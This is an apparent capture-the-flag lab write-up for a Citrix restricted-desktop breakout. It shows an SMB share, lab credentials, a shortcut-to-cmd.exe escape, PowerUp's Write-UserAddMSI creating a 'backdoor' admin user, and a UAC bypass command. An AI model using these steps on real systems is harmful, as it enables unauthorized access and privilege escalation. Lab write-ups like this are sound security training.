# [Citrix Breakout](Citrix%20Breakout.md)
### Submit the user flag from C:\Users\pmorgan\Downloads

Firstly, I have to get root by using `sudo -s` and then
```shell
smbserver.py -smb2support share $(pwd)
```
![](Screenshot%202026-08-24%20at%2011.12.45.png)

Navigate to `http://humongousretail.com/remote/` on Pivot Host
```citrixcredentials
Username: pmorgan 
Password: Summer1Summer! 
Domain: htb.local
```
![](Screenshot%202026-08-24%20at%2011.21.38.png)
![](Screenshot%202026-08-24%20at%2011.24.09.png)

Enter `\\127.0.0.1\c$\users\pmorgan\Downloads\flag.txt`![](Screenshot%202026-08-24%20at%2011.29.14.png)
### Submit the Administrator's flag from C:\Users\Administrator\Desktop

Right click -> Properties -> Change Target `C:\Windows\System32\cmd.exe`
![](Screenshot%202026-08-24%20at%2011.33.45.png)

Transferred file by SMB Share
![](Screenshot%202026-08-24%20at%2012.18.47.png)

Fix bypass policy
![](Screenshot%202026-08-24%20at%2012.20.57.png)

Running Powerup
![](Screenshot%202026-08-24%20at%2012.23.42.png)

Add a backdoor user

```powershell
Write-UserAddMSI
```
![](Screenshot%202026-08-24%20at%2012.25.39.png)

```powershell
msiexec /i C:\Users\Public\UserAdd.msi
```
![](Screenshot%202026-08-24%20at%2012.32.27.png)

Runas `backdoor` with `password123!` , I need to bypass UAC
![](Screenshot%202026-08-24%20at%2012.36.47.png)

```powershell
Bypass-UAC -Method UacMethodSysprep
```
![](Screenshot%202026-08-24%20at%2012.43.39.png)![](Screenshot%202026-08-24%20at%2012.45.34.png)